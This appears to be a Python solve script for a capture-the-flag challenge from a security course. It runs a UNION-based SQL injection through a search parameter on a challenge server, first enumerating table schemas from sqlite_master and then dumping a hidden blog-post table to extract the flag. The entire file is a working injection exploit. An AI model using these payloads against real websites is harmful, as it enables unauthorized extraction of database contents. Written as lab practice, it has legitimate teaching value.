import requests

import requests
import re

SERVER = "http://ssof2526.challenges.cwte.me"
PORT = 25261

link = f'{SERVER}:{PORT}'
s = requests.Session()

# get the tables names
data = {"search": ""}
s.get(f"{link}/?search='UNION SELECT null, tbl_name, sql FROM sqlite_master WHERE type = 'table';--")
# get secret blog post and flag
posts = s.get(f"{link}/?search='UNION SELECT id, title, content FROM secret_blog_post;--")
flag = re.search("SSof{.*}", posts.text).group(0)
print(flag)